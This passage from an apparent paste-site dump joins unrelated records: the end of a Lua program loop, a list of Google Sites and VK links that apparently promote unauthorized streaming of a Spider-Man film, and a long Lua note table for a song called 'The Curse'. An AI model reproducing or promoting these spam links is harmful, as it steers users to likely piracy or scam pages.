end

--[[
    ╔═══════════════════════════╗
    ║MAIN PROGRAM INITIALIZATION║
    ╚═══════════════════════════╝
--]]
function main()
    load()
    draw()
    while true do
        update()
        
        os.sleep(0.0) -- Wait for 0.1 seconds before updating again
    end
end

-- Run the program
main()

--================
--FINAL PART END
--================
"
PFq6WH6T,aesfrbest,gadungw71,PHP,Friday 2nd of June 2023 12:32:52 PM CDT,"https://sites.google.com/stylernews.com/filmhomemaranhaatravsdoaranhav/beranda
https://sites.google.com/stylernews.com/assistir-online-homem-aranha-a/home
https://sites.google.com/ghsjanga.com/assistir-homem-aranha-atravs-d/home
https://sites.google.com/jonin28.com/1080p-assistirhomemaranhaatrav/beranda
https://sites.google.com/jonin28.com/assistironlinehomem-aranhaatra/home
https://sites.google.com/jonin28.com/assistir-hd-homem-aranha-atrav/beranda
https://sites.google.com/stylernews.com/cuevana3verspider-manatravsdel/home
https://sites.google.com/stylernews.com/a-traves-del-spider-verso/home
https://sites.google.com/stylernews.com/pelisplusspider-manatravsdelsp/home
https://sites.google.com/stylernews.com/repelis-hdspider-mancruzandoel/home
https://vk.com/@piscesarya-assistir-homem-aranha-atraves-do-aranhaverso-filme-online-co
https://vk.com/@cinemarkmovieonline-assistir-homem-aranha-atraves-do-aranhaverso-2023-online-dub
https://vk.com/@blogchinemax-filme-homem-aranha-atraves-do-aranhaverso-dublado-em-portugu
https://sites.google.com/jonin28.com/cuevana4spider-mancruzandoelmu/home
https://sites.google.com/jonin28.com/ver-spider-man-a-travs-del-spi/beranda
https://zeerotech.us/palmer-2021-el-encuentro-magico-entre-musica-y-naturaleza/"
aKcHV0QD,The Curse.lua,Tbonetomtom,Lua,Friday 2nd of June 2023 12:20:34 PM CDT,"function makeSong()
	temp = {}
	temp[""tps""] = 12.39
	temp[""title""] = ""The Curse""
	temp[1] = {{0, -1}, }
	temp[2] = {}
	temp[3] = {}
	temp[4] = {}
	temp[5] = {}
	temp[6] = {}
	temp[7] = {}
	temp[8] = {}
	temp[9] = {{0, -1}, }
	temp[10] = {}
	temp[11] = {}
	temp[12] = {}
	temp[13] = {{0, 6}, {0, 11}, }
	temp[14] = {}
	temp[15] = {}
	temp[16] = {}
	temp[17] = {}
	temp[18] = {}
	temp[19] = {}
	temp[20] = {}
	temp[21] = {}
	temp[22] = {}
	temp[23] = {}
	temp[24] = {}
	temp[25] = {{0, 2}, }
	temp[26] = {}
	temp[27] = {}
	temp[28] = {}
	temp[29] = {}
	temp[30] = {}
	temp[31] = {}
	temp[32] = {}
	temp[33] = {{0, 2}, }
	temp[34] = {}
	temp[35] = {}
	temp[36] = {}
	temp[37] = {{0, 9}, {0, 14}, }
	temp[38] = {}
	temp[39] = {}
	temp[40] = {}
	temp[41] = {}
	temp[42] = {}
	temp[43] = {}
	temp[44] = {}
	temp[45] = {{0, 9}, {0, 14}, }
	temp[46] = {}
	temp[47] = {}
	temp[48] = {}
	temp[49] = {{0, -6}, }
	temp[50] = {}
	temp[51] = {}
	temp[52] = {}
	temp[53] = {}
	temp[54] = {}
	temp[55] = {}
	temp[56] = {}
	temp[57] = {{0, -6}, }
	temp[58] = {}
	temp[59] = {}
	temp[60] = {}
	temp[61] = {{0, 1}, {0, 6}, }
	temp[62] = {}
	temp[63] = {}
	temp[64] = {}
	temp[65] = {}
	temp[66] = {}
	temp[67] = {}
	temp[68] = {}
	temp[69] = {{0, 1}, {0, 6}, }
	temp[70] = {}
	temp[71] = {}
	temp[72] = {}
	temp[73] = {{0, -8}, }
	temp[74] = {}
	temp[75] = {}
	temp[76] = {}
	temp[77] = {}
	temp[78] = {}
	temp[79] = {}
	temp[80] = {}
	temp[81] = {{0, -8}, }
	temp[82] = {}
	temp[83] = {}
	temp[84] = {}
	temp[85] = {{0, -1}, {0, 4}, }
	temp[86] = {}
	temp[87] = {}
	temp[88] = {}
	temp[89] = {}
	temp[90] = {}
	temp[91] = {}
	temp[92] = {}
	temp[93] = {{0, 2}, }
	temp[94] = {}
	temp[95] = {}
	temp[96] = {}
	temp[97] = {}
	temp[98] = {}
	temp[99] = {}
	temp[100] = {}
	temp[101] = {{0, 1}, }
	temp[102] = {}
	temp[103] = {}
	temp[104] = {}
	temp[105] = {}
	temp[106] = {}
	temp[107] = {}
	temp[108] = {}
	temp[109] = {{0, -1}, }
	temp[110] = {}
	temp[111] = {}
	temp[112] = {}
	temp[113] = {{0, 18}, }
	temp[114] = {}
	temp[115] = {}
	temp[116] = {}
	temp[117] = {{0, 18}, }
	temp[118] = {}
	temp[119] = {}
	temp[120] = {}
	temp[121] = {{0, 6}, }
	temp[122] = {}
	temp[123] = {}
	temp[124] = {}
	temp[125] = {{0, 18}, }
	temp[126] = {}
	temp[127] = {}
	temp[128] = {}
	temp[129] = {{0, 18}, }
	temp[130] = {}
	temp[131] = {}
	temp[132] = {}
	temp[133] = {{0, 2}, }
	temp[134] = {}
	temp[135] = {}
	temp[136] = {}
	temp[137] = {{0, 18}, }
	temp[138] = {}
	temp[139] = {}
	temp[140] = {}
	temp[141] = {{0, 18}, }
	temp[142] = {}
	temp[143] = {}
	temp[144] = {}
	temp[145] = {{0, 9}, }
	temp[146] = {}
	temp[147] = {}
	temp[148] = {}
	temp[149] = {{0, 18}, }
	temp[150] = {}
	temp[151] = {}
	temp[152] = {}
	temp[153] = {{0, 18}, }
	temp[154] = {}
	temp[155] = {}
	temp[156] = {}
	temp[157] = {{0, -6}, }
	temp[158] = {}
	temp[159] = {}
	temp[160] = {}
	temp[161] = {{0, 18}, }
	temp[162] = {}
	temp[163] = {}
	temp[164] = {}
	temp[165] = {{0, 18}, }
	temp[166] = {}
	temp[167] = {}
	temp[168] = {}
	temp[169] = {{0, 1}, }
	temp[170] = {}
	temp[171] = {}
	temp[172] = {}
	temp[173] = {{0, 18}, }
	temp[174] = {}
	temp[175] = {}
	temp[176] = {}
	temp[177] = {{0, 18}, }
	temp[178] = {}
	temp[179] = {}
	temp[180] = {}
	temp[181] = {{0, -8}, }
	temp[182] = {}
	temp[183] = {}
	temp[184] = {}
	temp[185] = {{0, 16}, }
	temp[186] = {}
	temp[187] = {}
	temp[188] = {}
	temp[189] = {{0, 16}, }
	temp[190] = {}
	temp[191] = {}
	temp[192] = {}
	temp[193] = {{0, -1}, }
	temp[194] = {}
	temp[195] = {}
	temp[196] = {}
	temp[197] = {{0, 16}, }
	temp[198] = {}
	temp[199] = {}
	temp[200] = {}
	temp[201] = {{0, 16}, }
	temp[202] = {}
	temp[203] = {}
	temp[204] = {}
	temp[205] = {{0, -13}, }
	temp[206] = {}
	temp[207] = {}
	temp[208] = {}
	temp[209] = {{0, 18}, }
	temp[210] = {}
	temp[211] = {}
	temp[212] = {}
	temp[213] = {{0, 18}, }
	temp[214] = {}
	temp[215] = {}
	temp[216] = {}
	temp[217] = {{0, -1}, {0, 6}, }
	temp[218] = {}
	temp[219] = {}
	temp[220] = {}
	temp[221] = {{0, 18}, }
	temp[222] = {}
	temp[223] = {}
	temp[224] = {}
	temp[225] = {{0, 18}, }
	temp[226] = {}
	temp[227] = {}
	temp[228] = {}
	temp[229] = {{0, -10}, }
	temp[230] = {}
	temp[231] = {}
	temp[232] = {}
	temp[233] = {{0, 18}, }
	temp[234] = {}
	temp[235] = {}
	temp[236] = {}
	temp[237] = {{0, 18}, }
	temp[238] = {}
	temp[239] = {}
	temp[240] = {}
	temp[241] = {{0, 6}, {0, 9}, }
	temp[242] = {}
	temp[243] = {}
	temp[244] = {}
	temp[245] = {{0, 18}, }
	temp[246] = {}
	temp[247] = {}
	temp[248] = {}
	temp[249] = {{0, 18}, }
	temp[250] = {}
	temp[251] = {}
	temp[252] = {}
	temp[253] = {{0, -6}, }
	temp[254] = {}
	temp[255] = {}
	temp[256] = {}
	temp[257] = {{0, 18}, }
	temp[258] = {}
	temp[259] = {}
	temp[260] = {}
	temp[261] = {{0, 18}, }
	temp[262] = {}
	temp[263] = {}
	temp[264] = {}
	temp[265] = {{0, 1}, {0, 6}, }
	temp[266] = {}
	temp[267] = {}
	temp[268] = {}
	temp[269] = {{0, 18}, }
	temp[270] = {}
	temp[271] = {}
	temp[272] = {}
	temp[273] = {{0, 18}, }
	temp[274] = {}
	temp[275] = {}
	temp[276] = {}
	temp[277] = {{0, -8}, }
	temp[278] = {}
	temp[279] = {}
	temp[280] = {}
	temp[281] = {{0, 16}, }
	temp[282] = {}
	temp[283] = {}
	temp[284] = {}
	temp[285] = {{0, 16}, }
	temp[286] = {}
	temp[287] = {}
	temp[288] = {}
	temp[289] = {{0, 16}, {0, -1}, {0, 4}, }
	temp[290] = {}
	temp[291] = {}
	temp[292] = {}
	temp[293] = {{0, 14}, }
	temp[294] = {}
	temp[295] = {}
	temp[296] = {}
	temp[297] = {{0, 13}, }
	temp[298] = {}
	temp[299] = {}
	temp[300] = {}
	temp[301] = {{0, -13}, }
	temp[302] = {}
	temp[303] = {}
	temp[304] = {}
	temp[305] = {}
	temp[306] = {}
	temp[307] = {}
	temp[308] = {}
	temp[309] = {}
	temp[310] = {}
	temp[311] = {}
	temp[312] = {}
	temp[313] = {{0, 14}, {0, 23}, {0, -1}, }
	temp[314] = {}
	temp[315] = {}
	temp[316] = {}
	temp[317] = {}
	temp[318] = {}
	temp[319] = {}
	temp[320] = {}
	temp[321] = {{0, 18}, }
	temp[322] = {}
	temp[323] = {}
	temp[324] = {}
	temp[325] = {{0, 14}, {0, 21}, {0, -10}, }
	temp[326] = {}
	temp[327] = {}
	temp[328] = {}
	temp[329] = {}
	temp[330] = {}
	temp[331] = {}
	temp[332] = {}
	temp[333] = {{0, 18}, }
	temp[334] = {}
	temp[335] = {}
	temp[336] = {}
	temp[337] = {{0, 14}, {0, 21}, {0, 2}, }
	temp[338] = {}
	temp[339] = {}
	temp[340] = {}
	temp[341] = {}
	temp[342] = {}
	temp[343] = {}
	temp[344] = {}
	temp[345] = {{0, 18}, }
	temp[346] = {}
	temp[347] = {}
	temp[348] = {}
	temp[349] = {{0, 13}, {0, 21}, {0, -6}, }
	temp[350] = {}
	temp[351] = {}
	temp[352] = {}
	temp[353] = {}
	temp[354] = {}
	temp[355] = {}
	temp[356] = {}
	temp[357] = {{0, 18}, }
	temp[358] = {}
	temp[359] = {}
	temp[360] = {}
	temp[361] = {{0, 13}, {0, 21}, {0, 1}, {0, 6}, }
	temp[362] = {}
	temp[363] = {}
	temp[364] = {}
	temp[365] = {}
	temp[366] = {}
	temp[367] = {}
	temp[368] = {}
	temp[369] = {{0, 20}, }
	temp[370] = {}
	temp[371] = {}
	temp[372] = {}
	temp[373] = {{0, 20}, {0, 16}, {0, -8}, }
	temp[374] = {}
	temp[375] = {}
	temp[376] = {}
	temp[377] = {{0, 26}, }
	temp[378] = {}
	temp[379] = {}
	temp[380] = {}
	temp[381] = {{0, 25}, }
	temp[382] = {}
	temp[383] = {}
	temp[384] = {}
	temp[385] = {{0, -1}, {0, 4}, }
	temp[386] = {}
	temp[387] = {}
	temp[388] = {}
	temp[389] = {{0, 2}, }
	temp[390] = {}
	temp[391] = {}
	temp[392] = {}
	temp[393] = {{0, 1}, }
	temp[394] = {}
	temp[395] = {}
	temp[396] = {}
	temp[397] = {{0, 14}, {0, 23}, {0, -13}, }
	temp[398] = {}
	temp[399] = {}
	temp[400] = {}
	temp[401] = {}
	temp[402] = {}
	temp[403] = {}
	temp[404] = {}
	temp[405] = {{0, 18}, }
	temp[406] = {}
	temp[407] = {}
	temp[408] = {}
	temp[409] = {{0, 14}, {0, 23}, {0, -1}, }
	temp[410] = {}
	temp[411] = {}
	temp[412] = {}
	temp[413] = {}
	temp[414] = {}
	temp[415] = {}
	temp[416] = {}
	temp[417] = {{0, 18}, }
	temp[418] = {}
	temp[419] = {}
	temp[420] = {}
	temp[421] = {{0, 21}, {0, 18}, {0, -10}, }
	temp[422] = {}
	temp[423] = {}
	temp[424] = {}
	temp[425] = {{0, 23}, }
	temp[426] = {}
	temp[427] = {}
	temp[428] = {}
	temp[429] = {{0, 21}, }
	temp[430] = {}
	temp[431] = {}
	temp[432] = {}
	temp[433] = {{0, 2}, }
	temp[434] = {}
	temp[435] = {}
	temp[436] = {}
	temp[437] = {}
	temp[438] = {}
	temp[439] = {}
	temp[440] = {}
	temp[441] = {{0, 14}, {0, 21}, }
	temp[442] = {}
	temp[443] = {}
	temp[444] = {}
	temp[445] = {{0, 13}, {0, 21}, {0, -6}, }
	temp[446] = {}
	temp[447] = {}
	temp[448] = {}
	temp[449] = {}
	temp[450] = {}
	temp[451] = {}
	temp[452] = {}
	temp[453] = {{0, 14}, {0, 21}, }
	temp[454] = {}
	temp[455] = {}
	temp[456] = {}
	temp[457] = {{0, 13}, {0, 21}, {0, 1}, {0, 6}, }
	temp[458] = {}
	temp[459] = {}
	temp[460] = {}
	temp[461] = {{0, 16}, {0, 20}, }
	temp[462] = {}
	temp[463] = {}
	temp[464] = {}
	temp[465] = {}
	temp[466] = {}
	temp[467] = {}
	temp[468] = {}
	temp[469] = {{0, -8}, }
	temp[470] = {}
	temp[471] = {}
	temp[472] = {}
	temp[473] = {{0, 20}, {0, 18}, }
	temp[474] = {{0, 20}, }
	temp[475] = {}
	temp[476] = {}
	temp[477] = {{0, 18}, }
	temp[478] = {}
	temp[479] = {}
	temp[480] = {}
	temp[481] = {{0, -1}, {0, 4}, }
	temp[482] = {}
	temp[483] = {}
	temp[484] = {}
	temp[485] = {{0, 2}, }
	temp[486] = {}
	temp[487] = {}
	temp[488] = {}
	temp[489] = {{0, 1}, }
	temp[490] = {}
	temp[491] = {}
	temp[492] = {}
	temp[493] = {{0, 14}, {0, 23}, {0, -13}, }
	temp[494] = {}
	temp[495] = {}
	temp[496] = {}
	temp[497] = {{0, 14}, {0, 23}, }
	temp[498] = {}
	temp[499] = {}
	temp[500] = {}
	temp[501] = {{0, 14}, {0, 23}, }
	temp[502] = {}
	temp[503] = {}
	temp[504] = {}
	temp[505] = {{0, -3}, }
	temp[506] = {}
	temp[507] = {}
	temp[508] = {}
	temp[509] = {{0, -1}, }
	temp[510] = {}
	temp[511] = {}
	temp[512] = {}
	temp[513] = {{0, 18}, {0, -8}, }
	temp[514] = {}
	temp[515] = {}
	temp[516] = {}
	temp[517] = {{0, 14}, {0, 21}, {0, -10}, }
	temp[518] = {}
	temp[519] = {}
	temp[520] = {}
	temp[521] = {{0, 14}, {0, 21}, }
	temp[522] = {}
	temp[523] = {}
	temp[524] = {}
	temp[525] = {{0, 14}, {0, 21}, }
	temp[526] = {}
	temp[527] = {}
	temp[528] = {}
	temp[529] = {{0, 2}, }
	temp[530] = {}
	temp[531] = {}
	temp[532] = {}
	temp[533] = {}
	temp[534] = {}
	temp[535] = {}
	temp[536] = {}
	temp[537] = {{0, 18}, {0, -3}, }
	temp[538] = {}
	temp[539] = {}
	temp[540] = {}
	temp[541] = {{0, 13}, {0, 21}, {0, -6}, }
	temp[542] = {}
	temp[543] = {}
	temp[544] = {}
	temp[545] = {{0, 13}, {0, 21}, }
	temp[546] = {}
	temp[547] = {}
	temp[548] = {}
	temp[549] = {{0, 14}, {0, 21}, }
	temp[550] = {}
	temp[551] = {}
	temp[552] = {}
	temp[553] = {{0, 16}, {0, 20}, {0, 1}, }
	temp[554] = {}
	temp[555] = {}
	temp[556] = {}
	temp[557] = {}
	temp[558] = {}
	temp[559] = {}
	temp[560] = {}
	temp[561] = {{0, -6}, }
	temp[562] = {}
	temp[563] = {}
	temp[564] = {}
	temp[565] = {{0, 20}, {0, 16}, {0, -8}, }
	temp[566] = {}
	temp[567] = {}
	temp[568] = {}
	temp[569] = {{0, 26}, }
	temp[570] = {}
	temp[571] = {}
	temp[572] = {}
	temp[573] = {{0, 25}, }
	temp[574] = {}
	temp[575] = {}
	temp[576] = {}
	temp[577] = {{0, -1}, {0, 4}, }
	temp[578] = {}
	temp[579] = {}
	temp[580] = {}
	temp[581] = {{0, 2}, }
	temp[582] = {}
	temp[583] = {}
	temp[584] = {}
	temp[585] = {{0, 1}, }
	temp[586] = {}
	temp[587] = {}
	temp[588] = {}
	temp[589] = {{0, 23}, {0, -13}, }
	temp[590] = {}
	temp[591] = {}
	temp[592] = {}
	temp[593] = {{0, 23}, }
	temp[594] = {}
	temp[595] = {}
	temp[596] = {}
	temp[597] = {{0, 23}, }
	temp[598] = {}
	temp[599] = {}
	temp[600] = {}
	temp[601] = {{0, 14}, {0, -6}, }
	temp[602] = {}
	temp[603] = {}
	temp[604] = {}
	temp[605] = {{0, 18}, {0, 21}, {0, 25}, }
	temp[606] = {}
	temp[607] = {}
	temp[608] = {}
	temp[609] = {{0, -8}, }
	temp[610] = {}
	temp[611] = {}
	temp[612] = {}
	temp[613] = {{0, 14}, {0, 21}, {0, -10}, }
	temp[614] = {}
	temp[615] = {}
	temp[616] = {}
	temp[617] = {}
	temp[618] = {}
	temp[619] = {}
	temp[620] = {}
	temp[621] = {{0, 20}, }
	temp[622] = {}
	temp[623] = {}
	temp[624] = {}
	temp[625] = {{0, 14}, {0, 21}, {0, 2}, }
	temp[626] = {}
	temp[627] = {}
	temp[628] = {}
	temp[629] = {}
	temp[630] = {}
	temp[631] = {}
	temp[632] = {}
	temp[633] = {{0, -3}, }
	temp[634] = {}
	temp[635] = {}
	temp[636] = {}
	temp[637] = {{0, 21}, {0, 18}, {0, -6}, }
	temp[638] = {}
	temp[639] = {}
	temp[640] = {}
	temp[641] = {{0, 21}, }
	temp[642] = {}
	temp[643] = {}
	temp[644] = {}
	temp[645] = {{0, 21}, }
	temp[646] = {}
	temp[647] = {}
	temp[648] = {}
	temp[649] = {}
	temp[650] = {}
	temp[651] = {}
	temp[652] = {}
	temp[653] = {}
	temp[654] = {}
	temp[655] = {}
	temp[656] = {}
	temp[657] = {{0, 20}, }
	temp[658] = {}
	temp[659] = {}
	temp[660] = {}
	temp[661] = {{0, 21}, {0, 16}, {0, -1}, {0, 4}, }
	temp[662] = {}
	temp[663] = {}
	temp[664] = {}
	temp[665] = {{0, 20}, }
	temp[666] = {}
	temp[667] = {}
	temp[668] = {}
	temp[669] = {}
	temp[670] = {}
	temp[671] = {}
	temp[672] = {}
	temp[673] = {{0, 11}, {0, 16}, {0, -1}, {0, 4}, }
	temp[674] = {}
	temp[675] = {}
	temp[676] = {}
	temp[677] = {{0, 9}, {0, 16}, {0, 1}, }
	temp[678] = {}
	temp[679] = {}
	temp[680] = {}
	temp[681] = {{0, 11}, {0, 16}, {0, 2}, }
	temp[682] = {}
	temp[683] = {}
	temp[684] = {}
	temp[685] = {{0, -1}, }
	temp[686] = {}
	temp[687] = {}
	temp[688] = {}
	temp[689] = {{0, 18}, {0, 26}, {0, 2}, }
	temp[690] = {}
	temp[691] = {}
	temp[692] = {}
	temp[693] = {{0, 18}, {0, 25}, {0, 6}, }
	temp[694] = {}
	temp[695] = {}
	temp[696] = {}
	temp[697] = {{0, 11}, }
	temp[698] = {}
	temp[699] = {}
	temp[700] = {}
	temp[701] = {{0, 18}, {0, 26}, }
	temp[702] = {}
	temp[703] = {}
	temp[704] = {}
	temp[705] = {{0, 18}, {0, 25}, }
	temp[706] = {}
	temp[707] = {}
	temp[708] = {}
	temp[709] = {{0, 2}, }
	temp[710] = {}
	temp[711] = {}
	temp[712] = {}
	temp[713] = {{0, 18}, {0, 26}, }
	temp[714] = {}
	temp[715] = {}
	temp[716] = {}
	temp[717] = {{0, 18}, {0, 25}, {0, 9}, }
	temp[718] = {}
	temp[719] = {}
	temp[720] = {}
	temp[721] = {{0, 6}, {0, 14}, }
	temp[722] = {}
	temp[723] = {}
	temp[724] = {}
	temp[725] = {{0, 18}, {0, 26}, }
	temp[726] = {}
	temp[727] = {}
	temp[728] = {}
	temp[729] = {{0, 18}, {0, 25}, }
	temp[730] = {}
	temp[731] = {}
	temp[732] = {}
	temp[733] = {{0, -6}, }
	temp[734] = {}
	temp[735] = {}
	temp[736] = {}
	temp[737] = {{0, 18}, {0, 25}, }
	temp[738] = {}
	temp[739] = {}
	temp[740] = {}
	temp[741] = {{0, 18}, {0, 23}, }
	temp[742] = {}
	temp[743] = {}
	temp[744] = {}
	temp[745] = {{0, 1}, {0, 6}, }
	temp[746] = {}
	temp[747] = {}
	temp[748] = {}
	temp[749] = {{0, 18}, {0, 23}, }
	temp[750] = {}
	temp[751] = {}
	temp[752] = {}
	temp[753] = {{0, 18}, {0, 21}, }
	temp[754] = {}
	temp[755] = {}
	temp[756] = {}
	temp[757] = {{0, -8}, }
	temp[758] = {}
	temp[759] = {}
	temp[760] = {}
	temp[761] = {{0, 16}, {0, 21}, }
	temp[762] = {}
	temp[763] = {}
	temp[764] = {}
	temp[765] = {{0, 16}, {0, 20}, }
	temp[766] = {}
	temp[767] = {}
	temp[768] = {}
	temp[769] = {{0, 4}, }
	temp[770] = {}
	temp[771] = {}
	temp[772] = {}
	temp[773] = {{0, 16}, {0, 20}, {0, 1}, }
	temp[774] = {}
	temp[775] = {}
	temp[776] = {}
	temp[777] = {{0, 14}, {0, 18}, {0, 2}, }
	temp[778] = {}
	temp[779] = {}
	temp[780] = {}
	temp[781] = {{0, -1}, }
	temp[782] = {}
	temp[783] = {}
	temp[784] = {}
	temp[785] = {{0, 18}, {0, 26}, {0, 2}, }
	temp[786] = {}
	temp[787] = {}
	temp[788] = {}
	temp[789] = {{0, 18}, {0, 25}, {0, 6}, }
	temp[790] = {}
	temp[791] = {}
	temp[792] = {}
	temp[793] = {{0, 11}, }
	temp[794] = {}
	temp[795] = {}
	temp[796] = {}
	temp[797] = {{0, 18}, {0, 26}, }
	temp[798] = {}
	temp[799] = {}
	temp[800] = {}
	temp[801] = {{0, 18}, {0, 25}, {0, 1}, }
	temp[802] = {}
	temp[803] = {}
	temp[804] = {}
	temp[805] = {{0, 2}, }
	temp[806] = {}
	temp[807] = {}
	temp[808] = {}
	temp[809] = {{0, 18}, {0, 26}, }
	temp[810] = {}
	temp[811] = {}
	temp[812] = {}
	temp[813] = {{0, 18}, {0, 25}, {0, 9}, }
	temp[814] = {}
	temp[815] = {}
	temp[816] = {}
	temp[817] = {{0, 6}, {0, 14}, }
	temp[818] = {}
	temp[819] = {}
	temp[820] = {}
	temp[821] = {{0, 18}, {0, 26}, }
	temp[822] = {}
	temp[823] = {}
	temp[824] = {}
	temp[825] = {{0, 18}, {0, 25}, }
	temp[826] = {}
	temp[827] = {}
	temp[828] = {}
	temp[829] = {{0, -6}, }
	temp[830] = {}
	temp[831] = {}
	temp[832] = {}
	temp[833] = {{0, 18}, {0, 25}, }
	temp[834] = {}
	temp[835] = {}
	temp[836] = {}
	temp[837] = {{0, 18}, {0, 23}, }
	temp[838] = {}
	temp[839] = {}
	temp[840] = {}
	temp[841] = {{0, 1}, {0, 6}, }
	temp[842] = {}
	temp[843] = {}
	temp[844] = {}
	temp[845] = {{0, 18}, {0, 23}, }
	temp[846] = {}
	temp[847] = {}
	temp[848] = {}
	temp[849] = {{0, 18}, {0, 21}, }
	temp[850] = {}
	temp[851] = {}
	temp[852] = {}
	temp[853] = {{0, -8}, }
	temp[854] = {}
	temp[855] = {}
	temp[856] = {}
	temp[857] = {{0, 16}, {0, 21}, }
	temp[858] = {}
	temp[859] = {}
	temp[860] = {}
	temp[861] = {{0, 16}, {0, 20}, }
	temp[862] = {}
	temp[863] = {}
	temp[864] = {}
	temp[865] = {{0, -8}, }
	temp[866] = {}
	temp[867] = {}
	temp[868] = {}
	temp[869] = {{0, -10}, }
	temp[870] = {}
	temp[871] = {}
	temp[872] = {}
	temp[873] = {{0, 18}, {0, -11}, }
	temp[874] = {}
	temp[875] = {}
	temp[876] = {}
	temp[877] = {{0, 18}, {0, -13}, }
	temp[878] = {}
	temp[879] = {}
	temp[880] = {}
	temp[881] = {}
	temp[882] = {}
	temp[883] = {{0, -6}, }
	temp[884] = {}
	temp[885] = {{0, 1}, }
	temp[886] = {}
	temp[887] = {}
	temp[888] = {}
	temp[889] = {{0, 18}, {0, 25}, {0, 2}, }
	temp[890] = {{0, 30}, }
	temp[891] = {}
	temp[892] = {}
	temp[893] = {{0, -1}, }
	temp[894] = {}
	temp[895] = {}
	temp[896] = {}
	temp[897] = {{0, -6}, }
	temp[898] = {}
	temp[899] = {}
	temp[900] = {}
	temp[901] = {{0, -10}, }
	temp[902] = {}
	temp[903] = {}
	temp[904] = {}
	temp[905] = {{0, 23}, {0, 28}, {0, -3}, }
	temp[906] = {}
	temp[907] = {}
	temp[908] = {}
	temp[909] = {{0, 26}, {0, 2}, }
	temp[910] = {}
	temp[911] = {}
	temp[912] = {}
	temp[913] = {{0, 21}, {0, 25}, {0, 6}, }
	temp[914] = {}
	temp[915] = {{0, 4}, }
	temp[916] = {}
	temp[917] = {{0, 2}, }
	temp[918] = {}
	temp[919] = {}
	temp[920] = {}
	temp[921] = {{0, 23}, {0, -3}, }
	temp[922] = {}
	temp[923] = {}
	temp[924] = {}
	temp[925] = {{0, 21}, {0, 25}, {0, -6}, }
	temp[926] = {}
	temp[927] = {}
	temp[928] = {}
	temp[929] = {{0, 20}, {0, 23}, {0, 1}, }
	temp[930] = {}
	temp[931] = {}
	temp[932] = {}
	temp[933] = {{0, -3}, }
	temp[934] = {}
	temp[935] = {}
	temp[936] = {}
	temp[937] = {{0, 21}, {0, 25}, {0, -6}, }
	temp[938] = {}
	temp[939] = {}
	temp[940] = {}
	temp[941] = {{0, 20}, {0, 23}, {0, 1}, }
	temp[942] = {}
	temp[943] = {}
	temp[944] = {}
	temp[945] = {{0, -3}, }
	temp[946] = {}
	temp[947] = {}
	temp[948] = {}
	temp[949] = {{0, 20}, {0, 23}, {0, -8}, }
	temp[950] = {}
	temp[951] = {}
	temp[952] = {}
	temp[953] = {{0, -1}, }
	temp[954] = {}
	temp[955] = {}
	temp[956] = {}
	temp[957] = {{0, 18}, {0, 23}, }
	temp[958] = {}
	temp[959] = {}
	temp[960] = {}
	temp[961] = {{0, 21}, {0, -8}, }
	temp[962] = {}
	temp[963] = {}
	temp[964] = {}
	temp[965] = {{0, 20}, {0, 1}, }
	temp[966] = {}
	temp[967] = {}
	temp[968] = {}
	temp[969] = {{0, 18}, {0, 2}, }
	temp[970] = {}
	temp[971] = {}
	temp[972] = {}
	temp[973] = {{0, 18}, {0, -13}, }
	temp[974] = {}
	temp[975] = {}
	temp[976] = {}
	temp[977] = {}
	temp[978] = {}
	temp[979] = {{0, -13}, }
	temp[980] = {}
	temp[981] = {{0, -6}, }
	temp[982] = {}
	temp[983] = {{0, -1}, }
	temp[984] = {}
	temp[985] = {{0, 18}, {0, 25}, {0, 2}, }
	temp[986] = {{0, 30}, }
	temp[987] = {}
	temp[988] = {}
	temp[989] = {{0, -1}, }
	temp[990] = {}
	temp[991] = {}
	temp[992] = {}
	temp[993] = {{0, -6}, }
	temp[994] = {}
	temp[995] = {}
	temp[996] = {}
	temp[997] = {{0, -10}, }
	temp[998] = {}
	temp[999] = {}
	temp[1000] = {}
	temp[1001] = {{0, 23}, {0, 28}, {0, -3}, }
	temp[1002] = {}
	temp[1003] = {}
	temp[1004] = {}
	temp[1005] = {{0, 26}, {0, 2}, }
	temp[1006] = {}
	temp[1007] = {}
	temp[1008] = {}
	temp[1009] = {{0, 21}, {0, 25}, {0, 6}, }
	temp[1010] = {}
	temp[1011] = {{0, 4}, }
	temp[1012] = {}
	temp[1013] = {{0, 2}, }
	temp[1014] = {}
	temp[1015] = {}
	temp[1016] = {}
	temp[1017] = {{0, 23}, {0, -3}, }
	temp[1018] = {}
	temp[1019] = {}
	temp[1020] = {}
	temp[1021] = {{0, 21}, {0, 25}, {0, -6}, }
	temp[1022] = {}
	temp[1023] = {}
	temp[1024] = {}
	temp[1025] = {{0, 20}, {0, 23}, {0, 1}, }
	temp[1026] = {}
	temp[1027] = {}
	temp[1028] = {}
	temp[1029] = {{0, -3}, }
	temp[1030] = {}
	temp[1031] = {}
	temp[1032] = {}
	temp[1033] = {{0, 21}, {0, 25}, {0, -6}, }
	temp[1034] = {}
	temp[1035] = {}
	temp[1036] = {}
	temp[1037] = {{0, 23}, {0, 28}, {0, 1}, }
	temp[1038] = {}
	temp[1039] = {}
	temp[1040] = {}
	temp[1041] = {{0, 18}, {0, -3}, }
	temp[1042] = {}
	temp[1043] = {}
	temp[1044] = {}
	temp[1045] = {{0, 20}, {0, -8}, }
	temp[1046] = {}
	temp[1047] = {}
	temp[1048] = {}
	temp[1049] = {{0, -1}, }
	temp[1050] = {}
	temp[1051] = {}
	temp[1052] = {}
	temp[1053] = {{0, 21}, {0, 4}, }
	temp[1054] = {}
	temp[1055] = {}
	temp[1056] = {}
	temp[1057] = {{0, 18}, {0, -8}, {0, 4}, }
	temp[1058] = {}
	temp[1059] = {}
	temp[1060] = {}
	temp[1061] = {{0, -10}, {0, 2}, }
	temp[1062] = {}
	temp[1063] = {}
	temp[1064] = {}
	temp[1065] = {{0, 18}, {0, -11}, {0, 1}, }
	temp[1066] = {}
	temp[1067] = {}
	temp[1068] = {}
	temp[1069] = {{0, 18}, {0, -13}, {0, -1}, }
	temp[1070] = {}
	temp[1071] = {}
	temp[1072] = {}
	temp[1073] = {{0, -13}, }
	temp[1074] = {}
	temp[1075] = {{0, -6}, }
	temp[1076] = {}
	temp[1077] = {{0, -1}, }
	temp[1078] = {}
	temp[1079] = {{0, 1}, }
	temp[1080] = {}
	temp[1081] = {{0, 18}, {0, 25}, {0, 2}, }
	temp[1082] = {{0, 30}, }
	temp[1083] = {}
	temp[1084] = {}
	temp[1085] = {{0, -1}, }
	temp[1086] = {}
	temp[1087] = {}
	temp[1088] = {}
	temp[1089] = {{0, -6}, }
	temp[1090] = {}
	temp[1091] = {}
	temp[1092] = {}
	temp[1093] = {{0, -10}, }
	temp[1094] = {}
	temp[1095] = {}
	temp[1096] = {}
